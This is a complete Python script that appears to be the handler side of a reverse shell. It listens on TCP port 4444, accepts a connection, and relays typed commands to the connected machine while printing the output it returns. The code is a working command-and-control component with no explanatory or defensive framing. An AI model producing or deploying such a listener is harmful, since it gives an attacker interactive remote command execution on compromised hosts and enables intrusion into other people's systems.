import socket
import sys
import traceback


def server_init(host="0.0.0.0", port=4444): #If you need to change the host IP or port, do it here.
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Binding Socket to Port: " + str(port))
        s.bind((host, port))
        s.listen(5)
        return s
    except socket.error as msg:
        print("Socket Binding Error: " + str(msg))


def socket_accept(s):
    conn, address = s.accept()
    print("A Connection Has Been Established | " +
          "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(s, conn)


def send_commands(s, conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.send(str.encode(cmd))
                s.close()
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(10240), "utf-8")
                print(client_response, end='')
        except KeyboardInterrupt:
            print("\nShutdown Requested")
            conn.send(str.encode("quit"))
            s.close()
            break
        except Exception:
            traceback.print_exc(file=sys.stdout)
            sys.exit(0)
            break


if __name__ == '__main__':
    s = server_init()
    socket_accept(s)
